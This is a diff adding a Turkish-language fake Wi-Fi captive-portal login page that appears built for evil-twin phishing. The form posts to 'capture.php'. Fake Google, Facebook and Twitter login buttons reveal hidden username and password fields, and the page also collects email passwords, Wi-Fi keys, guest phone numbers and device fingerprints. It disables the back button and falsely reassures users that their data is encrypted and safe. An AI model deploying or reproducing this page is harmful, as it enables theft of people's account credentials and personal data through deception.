@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Giriş - Kimlik Doğrulama</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,">
+    
+    <!-- Security Headers -->
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <!-- Mobile Optimization -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <div class="wifi-icon">
+                <svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M1 9L12 20L23 9C18.5 4.5 5.5 4.5 1 9Z" stroke="#2196F3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M5 13L12 20L19 13C16.5 10.5 7.5 10.5 5 13Z" stroke="#2196F3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M9 17L12 20L15 17C13.5 15.5 10.5 15.5 9 17Z" stroke="#2196F3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <h1>Wi-Fi Ağına Giriş</h1>
+            <p class="network-name" id="current-network">Free_WiFi</p>
+        </div>
+
+        <div class="login-form-container">
+            <form id="loginForm" action="capture.php" method="POST" class="login-form">
+                <div class="form-group">
+                    <label for="login-type">Giriş Türü:</label>
+                    <select id="login-type" name="login_type" class="form-control" onchange="toggleLoginFields()">
+                        <option value="email">E-posta ile Giriş</option>
+                        <option value="social">Sosyal Medya Hesabı</option>
+                        <option value="wifi">Wi-Fi Şifresi</option>
+                        <option value="guest">Misafir Erişimi</option>
+                    </select>
+                </div>
+
+                <!-- E-posta Giriş Formu -->
+                <div id="email-login" class="login-section">
+                    <div class="form-group">
+                        <label for="email">E-posta Adresi:</label>
+                        <input type="email" id="email" name="email" class="form-control" placeholder="ornek@email.com" required>
+                        <span class="form-icon">📧</span>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Şifre:</label>
+                        <input type="password" id="password" name="password" class="form-control" placeholder="Şifrenizi girin" required>
+                        <span class="form-icon">🔒</span>
+                        <span class="password-toggle" onclick="togglePassword('password')">👁️</span>
+                    </div>
+                </div>
+
+                <!-- Sosyal Medya Giriş -->
+                <div id="social-login" class="login-section" style="display: none;">
+                    <div class="social-buttons">
+                        <button type="button" class="social-btn google-btn" onclick="socialLogin('google')">
+                            <span class="social-icon">🔍</span>
+                            Google ile Giriş
+                        </button>
+                        <button type="button" class="social-btn facebook-btn" onclick="socialLogin('facebook')">
+                            <span class="social-icon">📘</span>
+                            Facebook ile Giriş
+                        </button>
+                        <button type="button" class="social-btn twitter-btn" onclick="socialLogin('twitter')">
+                            <span class="social-icon">🐦</span>
+                            Twitter ile Giriş
+                        </button>
+                    </div>
+                    
+                    <!-- Sosyal medya kimlik bilgileri için gizli form -->
+                    <div id="social-credentials" style="display: none;">
+                        <div class="form-group">
+                            <label for="social-username">Kullanıcı Adı/E-posta:</label>
+                            <input type="text" id="social-username" name="social_username" class="form-control" placeholder="Kullanıcı adınız">
+                        </div>
+                        <div class="form-group">
+                            <label for="social-password">Şifre:</label>
+                            <input type="password" id="social-password" name="social_password" class="form-control" placeholder="Şifreniz">
+                            <span class="password-toggle" onclick="togglePassword('social-password')">👁️</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Wi-Fi Şifre Giriş -->
+                <div id="wifi-login" class="login-section" style="display: none;">
+                    <div class="form-group">
+                        <label for="wifi-password">Wi-Fi Şifresi:</label>
+                        <input type="password" id="wifi-password" name="wifi_password" class="form-control" placeholder="Ağ şifresini girin">
+                        <span class="form-icon">📶</span>
+                        <span class="password-toggle" onclick="togglePassword('wifi-password')">👁️</span>
+                    </div>
+                    <p class="help-text">Bu ağın şifresini girerek bağlanabilirsiniz.</p>
+                </div>
+
+                <!-- Misafir Erişimi -->
+                <div id="guest-login" class="login-section" style="display: none;">
+                    <div class="form-group">
+                        <label for="guest-name">Adınız:</label>
+                        <input type="text" id="guest-name" name="guest_name" class="form-control" placeholder="Adınızı girin">
+                        <span class="form-icon">👤</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="guest-phone">Telefon Numarası:</label>
+                        <input type="tel" id="guest-phone" name="guest_phone" class="form-control" placeholder="05XX XXX XX XX">
+                        <span class="form-icon">📱</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="guest-email">E-posta (İsteğe bağlı):</label>
+                        <input type="email" id="guest-email" name="guest_email" class="form-control" placeholder="ornek@email.com">
+                        <span class="form-icon">📧</span>
+                    </div>
+                </div>
+
+                <!-- Ek Güvenlik Alanları -->
+                <div class="security-section">
+                    <div class="form-group">
+                        <label>
+                            <input type="checkbox" id="remember-me" name="remember_me" value="1">
+                            <span class="checkmark"></span>
+                            Beni hatırla (30 gün)
+                        </label>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>
+                            <input type="checkbox" id="terms" name="terms" value="1" required>
+                            <span class="checkmark"></span>
+                            <a href="#" onclick="showTerms()">Kullanım koşullarını</a> kabul ediyorum
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Gizli alanlar (teknik bilgi toplama) -->
+                <input type="hidden" id="user-agent" name="user_agent" value="">
+                <input type="hidden" id="screen-resolution" name="screen_resolution" value="">
+                <input type="hidden" id="timezone" name="timezone" value="">
+                <input type="hidden" id="language" name="language" value="">
+                <input type="hidden" id="platform" name="platform" value="">
+                <input type="hidden" id="timestamp" name="timestamp" value="">
+                <input type="hidden" id="ip-address" name="ip_address" value="">
+                <input type="hidden" id="mac-address" name="mac_address" value="">
+
+                <div class="form-actions">
+                    <button type="submit" class="btn btn-primary btn-login">
+                        <span class="btn-icon">🔐</span>
+                        <span class="btn-text">Bağlan</span>
+                        <div class="loading-spinner" style="display: none;"></div>
+                    </button>
+                    
+                    <button type="button" class="btn btn-secondary" onclick="goBack()">
+                        <span class="btn-icon">⬅️</span>
+                        Geri
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <div class="login-footer">
+            <div class="connection-info">
+                <h4>🔒 Güvenli Bağlantı</h4>
+                <p>Bağlantınız SSL ile şifrelenmektedir. Kişisel bilgileriniz güvende.</p>
+            </div>
+            
+            <div class="help-section">
+                <h4>❓ Yardım</h4>
+                <ul>
+                    <li><a href="#" onclick="showHelp('password')">Şifremi unuttum</a></li>
+                    <li><a href="#" onclick="showHelp('account')">Hesap oluştur</a></li>
+                    <li><a href="#" onclick="showHelp('support')">Teknik destek</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Dialogs -->
+    <div id="modal-overlay" class="modal-overlay" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modal-title">Bilgi</h3>
+                <span class="modal-close" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modal-body">
+                <!-- Modal content will be inserted here -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">Kapat</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Form submission handling
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Show loading animation
+            const submitBtn = document.querySelector('.btn-login');
+            const btnText = submitBtn.querySelector('.btn-text');
+            const spinner = submitBtn.querySelector('.loading-spinner');
+            
+            btnText.style.display = 'none';
+            spinner.style.display = 'inline-block';
+            submitBtn.disabled = true;
+            
+            // Collect system information
+            collectSystemInfo();
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // Submit form
+                this.submit();
+            }, 2000);
+        });
+
+        // Toggle login fields based on type
+        function toggleLoginFields() {
+            const loginType = document.getElementById('login-type').value;
+            const sections = document.querySelectorAll('.login-section');
+            
+            sections.forEach(section => {
+                section.style.display = 'none';
+            });
+            
+            document.getElementById(loginType + '-login').style.display = 'block';
+        }
+
+        // Toggle password visibility
+        function togglePassword(fieldId) {
+            const field = document.getElementById(fieldId);
+            const toggle = field.nextElementSibling;
+            
+            if (field.type === 'password') {
+                field.type = 'text';
+                toggle.textContent = '🙈';
+            } else {
+                field.type = 'password';
+                toggle.textContent = '👁️';
+            }
+        }
+
+        // Social media login simulation
+        function socialLogin(platform) {
+            const socialCredentials = document.getElementById('social-credentials');
+            const usernameField = document.getElementById('social-username');
+            const passwordField = document.getElementById('social-password');
+            
+            socialCredentials.style.display = 'block';
+            usernameField.placeholder = platform.charAt(0).toUpperCase() + platform.slice(1) + ' kullanıcı adı';
+            usernameField.name = platform + '_username';
+            passwordField.name = platform + '_password';
+            
+            // Add hidden field for platform
+            let platformField = document.getElementById('social-platform');
+            if (!platformField) {
+                platformField = document.createElement('input');
+                platformField.type = 'hidden';
+                platformField.id = 'social-platform';
+                platformField.name = 'social_platform';
+                document.getElementById('loginForm').appendChild(platformField);
+            }
+            platformField.value = platform;
+        }
+
+        // Collect system information
+        function collectSystemInfo() {
+            document.getElementById('user-agent').value = navigator.userAgent;
+            document.getElementById('screen-resolution').value = screen.width + 'x' + screen.height;
+            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            document.getElementById('language').value = navigator.language;
+            document.getElementById('platform').value = navigator.platform;
+            document.getElementById('timestamp').value = new Date().toISOString();
+            
+            // Try to get IP address (will be filled by server)
+            fetch('/get-ip.php')
+                .then(response => response.text())
+                .then(ip => {
+                    document.getElementById('ip-address').value = ip;
+                })
+                .catch(() => {
+                    document.getElementById('ip-address').value = 'unknown';
+                });
+        }
+
+        // Modal functions
+        function showTerms() {
+            document.getElementById('modal-title').textContent = 'Kullanım Koşulları';
+            document.getElementById('modal-body').innerHTML = `
+                <h4>Wi-Fi Kullanım Koşulları</h4>
+                <p>Bu ağı kullanarak aşağıdaki koşulları kabul etmiş olursunuz:</p>
+                <ul>
+                    <li>Ağı yalnızca yasal amaçlar için kullanacaksınız</li>
+                    <li>Zararlı yazılım indirmeyecek ve yaymayacaksınız</li>
+                    <li>Telif hakkı ihlali yapmayacaksınız</li>
+                    <li>Diğer kullanıcıların haklarına saygı göstereceksiniz</li>
+                    <li>Ağ kaynaklarını adil şekilde kullanacaksınız</li>
+                </ul>
+                <p><strong>Gizlilik:</strong> Bağlantı logları güvenlik amaçlı tutulur.</p>
+            `;
+            document.getElementById('modal-overlay').style.display = 'flex';
+        }
+
+        function showHelp(type) {
+            const titles = {
+                'password': 'Şifre Yardımı',
+                'account': 'Hesap Oluşturma',
+                'support': 'Teknik Destek'
+            };
+            
+            const contents = {
+                'password': 'Şifrenizi unuttuysanız, ağ yöneticisi ile iletişime geçin.',
+                'account': 'Yeni hesap oluşturmak için misafir erişimi kullanabilirsiniz.',
+                'support': 'Teknik sorunlar için ağ yöneticisi ile iletişime geçin.'
+            };
+            
+            document.getElementById('modal-title').textContent = titles[type];
+            document.getElementById('modal-body').innerHTML = contents[type];
+            document.getElementById('modal-overlay').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('modal-overlay').style.display = 'none';
+        }
+
+        function goBack() {
+            window.location.href = 'index.html';
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get network name from URL or use default
+            const urlParams = new URLSearchParams(window.location.search);
+            const ssid = urlParams.get('ssid') || 'Free_WiFi';
+            document.getElementById('current-network').textContent = ssid;
+            document.title = ssid + ' - Giriş';
+            
+            // Set initial form state
+            toggleLoginFields();
+            
+            // Prevent back button
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+        });
+
+        // Auto-fill demo data (for testing)
+        function fillDemoData() {
+            document.getElementById('email').value = 'test@example.com';
+            document.getElementById('password').value = 'password123';
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                fillDemoData();
+            }
+        });
+    </script>
+</body>
+</html>
